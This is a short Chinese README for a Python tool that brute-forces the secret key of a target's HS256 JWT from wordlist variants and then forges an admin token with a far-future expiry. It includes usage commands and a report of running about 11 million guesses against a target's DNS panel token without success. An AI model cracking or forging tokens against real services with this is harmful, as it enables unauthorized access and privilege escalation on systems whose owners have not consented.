## 描述

对目标 JWT（HS256）做秘密密钥爆破的纯标准库脚本（无第三方依赖，python3 直接跑）。三段式：①词根+后缀+大小写/反转变体；②词根+0..99999 数字后缀（可调）；③短词根两两组合（含 _ - 与首字母大写）。命中即打印明文 secret 并落盘 runs/dns/jwt-secret-found.txt。

## 用法

```
python jwt_hs256_bruteforce.py crack <token文件> <字典文件>\npython jwt_hs256_bruteforce.py forge <secret> '{"user_id":1,"username":"admin","role":"admin","exp":9999999999,"iat":1}'\n# 实战：对 tgt9942-com 靶标 DNS 面板 token 跑出 1115 万候选（词根 120 × 后缀 60 × 变体5 + 每词根 0-99999 数字 + 词组两两），约 68 秒完成，未命中 → 目标 secret 有真实强度；说明脚本可用、但不该把时间全押在爆破上。
```
